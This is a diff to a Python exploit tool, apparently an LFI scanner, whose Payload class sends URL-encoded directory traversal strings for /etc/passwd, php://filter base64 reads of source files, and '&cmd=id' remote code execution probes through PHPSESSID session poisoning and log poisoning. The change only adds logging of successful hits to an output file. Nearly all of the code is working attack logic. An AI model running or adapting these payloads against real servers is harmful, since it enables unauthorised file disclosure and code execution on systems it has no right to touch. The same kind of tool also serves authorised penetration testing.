@@ -8,15 +8,16 @@ from termcolor import colored
 
 class Payload:
 
-	def __init__(self, url, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1):
+	def __init__(self, url, outfile, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1):
 		self.url = url.strip()
 		self.verbosity = verbosity
-		# The quote method automatically url encodes the string
+		self.outfile = outfile
 		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
 		# poc -> Proof Of Concept (Change it if you want)
 		self.poc = poc
 
 		# Filter
+		# The quote method automatically url encodes the string except for the "."
 		self.filterPaths = ["%2Fetc%2Fpasswd", quote("index"), quote("index.php"), quote("index.html")]
 		self.filterBase = quote("php://filter/read=convert.base64-encode/resource=")
 
@@ -80,6 +81,7 @@ class Payload:
 				clean = self.hit(compUrl)
 				if 'root:x' in clean.lower():
 					print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
+					self.outfile.write('[+] Directory traversal found with ' + compUrl + '\n')
 				else:
 					if self.verbosity > 0:
 						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
@@ -96,6 +98,7 @@ class Payload:
 			clean = self.hit(compUrl)
 			if 'uid=' in clean.lower():
 				print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)
+				self.outfile.write('[+] Remote code execution (RCE) found with ' + compUrl + '\n')
 			else:
 				if self.verbosity > 0:
 					print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
@@ -112,7 +115,8 @@ class Payload:
 			if len(words) > 0:
 				for word in words:
 					if word.endswith('='):
-						print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)			
+						print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)
+						self.outfile.write('[+] Files can be retrieved with php filter like so (encoded in base64) ' + compUrl + '\n')			
 					else:
 						if self.verbosity > 0:
 							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
@@ -142,6 +146,7 @@ class Payload:
 				clean = self.hit(compUrl)	
 				if 'uid='  in clean.lower():
 					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + cookiePath + '[cookie value] can be poisoned')
+					self.outfile.write('[+] Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + cookiePath + '[cookie value] can be poisoned\n')
 				else:
 					if self.verbosity > 0:
 						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')
@@ -164,7 +169,8 @@ class Payload:
 					compUrl = pathth + "&cmd=id"
 					clean = self.hit(compUrl)
 					if "uid=" in clean.lower():
-						print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)	
+						print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)
+						self.outfile.write('[+] Remote code execution (RCE) found with log poisong with the path ' + pathth + '\n')
 					else:
 						if self.verbosity > 0:
 							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')		
@@ -181,6 +187,7 @@ class Payload:
 					clean = self.hit(compUrl)
 					if "uid=" in clean.lower():
 						print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
+						self.outfile.write('[+] Remote code execution (RCE) found with log poisong with the path ' + pathh + '\n')
 					else:
 						if self.verbosity > 0:
 							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')	
